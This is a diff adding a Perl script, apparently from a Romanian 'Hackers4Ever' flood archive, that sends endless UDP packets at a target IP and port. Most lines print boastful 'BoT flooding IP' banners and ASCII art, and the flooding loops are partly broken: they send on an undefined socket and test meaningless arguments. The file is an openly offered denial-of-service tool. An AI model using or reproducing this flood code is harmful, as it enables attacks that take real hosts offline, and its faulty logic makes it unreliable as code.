@@ -1,0 +1,193 @@
+#!/usr/bin/perl
+
+
+use Socket;
+
+$ARGC=@ARGV;
+
+if ($ARGC !=3) {
+ printf "Comanda este perl $0 IP 500 0\n";
+ printf "Ai gresit comanda HaXoRasHule !\n";
+ exit(1);
+}
+
+my ($ip,$port,$size,$time);
+ $ip=$ARGV[0];
+ $port=$ARGV[1]; 
+ $time=$ARGV[2];
+
+socket(moshu, PF_INET, SOCK_DGRAM, 17);
+    $iaddr = inet_aton("$ip");
+printf "[0;32m ####################\n";
+printf "[0;32m #~ Cybernetik incarca botii\n";
+printf "[0;32m ####################\n";
+printf "[0;32m # LOADING BOTS !!! #\n";
+printf "[0;32m ####################\n";
+printf "[0;36mBoT #1 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #2 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #3 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #4 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #5 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #6 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #7 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #8 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #9 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #10 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #11 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #12 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #13 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #14 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #15 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #16 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #17 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #18 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #19 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #20 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #21 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #22 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #23 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #24 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #25 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #26 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #27 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #28 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #29 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #30 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #31 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #32 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #33 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #33 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #34 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #35 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #36 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #37 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #38 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #39 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #40 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #41 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #42 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #43 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #44 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #45 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #46 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #47 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #48 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #49 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #50 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #51 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #52 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #53 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #54 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #55 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #56 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #57 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #58 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #59 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #60 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #61 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #62 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #63 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #64 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #65 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #66 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #67 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #68 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #69 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #70 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #71 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #72 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #73 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #74 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #75 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #76 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #77 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #78 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #79 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #80 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #81 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #82 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #83 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #84 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #85 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #86 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #87 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #88 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #89 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #90 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #91 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #92 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #93 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #94 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #95 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #96 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #97 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #98 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #99 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #100 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #101 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #102 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #103 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #104 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #105 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #106 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #107 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #108 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #109 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #110 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #111 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #112 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;36mBoT #113 flooding IP ; Dau in el ca surdu-n clopot.\n";
+printf "[0;32m###########################################################################\n";
+printf "[0;31mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMNdddddddNMMMMMMMMNmddddddmMMMMMMMMMNddddddddmddddddddddddddddddddmMMMMM
+MMMMmhhhyyydNMMMMMMMMNdyyyyyhmMMMMMMMNmhyhhyyyhhddhdyyyhhyyyyyyyyyyyhmMMMMM
+MMMMmdhyyyydNMMMMMMMMNdyyyyyymMMMMMNmdyyyyyyhhhyddhyyyyhhyyyyyyyyyyyhmMMMMM
+MMMMmhhyyyydNMMMMMMMMNdsssssymMMMMmdyyssssyhyyyyddhhyyyhmNNNNNNNNNNNNNMMMMM
+MMMMmdyhyyshmMMMMMMMMNdsssssymMMNdysssssyhhysssyddyhhyyhmMMMMMMMMMMMMMMMMMM
+MMMMmhyhyyshdhhyyyhhhhdsssssymNdhsssssshmmyyyssydhyhyyshdhhyyyyhhhhhmMMMMMM
+MMMMmhsyyyydyssssssssydsssssymdysssssyddmdyysyyydhsyyyyhhssssssssssymMMMMMM
+MMMMmhsyyyshhhyyyyyyyhdssssyhmyysssssssssyssssssdhsyyyyhdhyyyyyyyyyhmMMMMMM
+MMMMmyssssshmNNNNNNNNmdssyssymsssosossssssooooosdhssosshmNNNNNNNNNNNMMMMMMM
+MMMMmyssosshNMMMMMMMMNdysssoymysssssssssyyssssssdhsoossymMMMMMMMMMMMMMMMMMM
+MMMMmysoooshNMMMMMMMMNhoooooymmmmmmmmmmmmdsooossdhsooosymmdddddddddddmMMMMM
+MMMMmyoyssshNMMMMMMMMNdooooosmMMMMMMMMMMMmyooooodhoysssydysooooooooosdNMMMM
+MMMMmhsdhsohNMMMMMMMMNdoooooymMMMMMMMMMMMmsoooosddshhyoyhshooossooooodNMMMM
+MMMMNmmNmmmmMMMMMMMMMNmmmmmmmNMMMMMMMMMMMNmmmmmmmmmNNmmmmmmmmmmmmmmmmmMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n";
+printf "[0;32m########################################################################### \n";
+printf "[0;31m# A r h i v a   d e   F L o o D   b y   [H 4 E] [H a c k e r s 4 E v e r] #\n";
+printf "[0;32m########################################################################### \n";
+printf "[0;31m# Realizatorii arhivei sunt :  # SiLE Cyber # qGabriela # FrankFurd # MSD # \n";
+printf "[0;32m########################################################################### \n";
+printf "[0;31m# FLooD-ul a fost trimis ; IP-ul a intrat in spital ; IP-DOWN a facut poc #\n";
+printf "[0;32m########################################################################### \n";
+if ($ARGV[1] ==0 && $ARGV[65500] ==0) {
+ goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[65500] !=0) {
+ system("(sleep $time;killall -9 udp) &");
+ goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[65500] ==0) {
+ goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[65500] !=0) {
+ system("(sleep $time;killall -9 udp) &"); 
+ goto randpackets;
+}
+packets:
+for (;;) {
+ $size=$rand x $rand x $rand;
+ send(moshu, 0, $size, sockaddr_in($port, $iaddr));
+} 
+randpackets:
+for (;;) {
+ $size=$rand x $rand x $rand;
+ for (;time() <= $endtime;) {
+ $psize = $size ? $size : int(rand(45000-65500)+65000) ;
+ $pport = $port ? $port : int(rand(65500))+9;
+ 
+ send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
+}
